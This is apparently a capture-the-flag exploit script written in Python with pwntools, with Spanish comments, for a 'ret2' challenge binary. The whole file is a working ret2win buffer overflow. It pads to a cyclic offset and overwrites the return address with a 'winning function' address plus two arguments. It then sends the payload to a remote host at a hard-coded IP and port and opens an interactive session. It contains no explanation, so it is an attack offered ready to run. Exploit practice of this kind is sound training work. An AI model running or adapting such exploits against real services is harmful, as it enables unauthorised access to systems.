from pwn import *
#argumentos
arg1 = 0xDEADBEEF
arg2 = 0xDEADC0DE
#funcion ganadora
latin = 0x08049192
#r = process('./ret2')
r = remote('208.68.39.19', 4459)
#gdb.attach(r)
print r.recvline()
payload = "A" * cyclic_find('aaak') #offset
payload += p32(latin) #funcion ganadora
payload += "DPLA" #bad exit
payload += p32(arg1) #argumentos
payload += p32(arg2) #argumentos
r.sendline(payload)
r.interactive()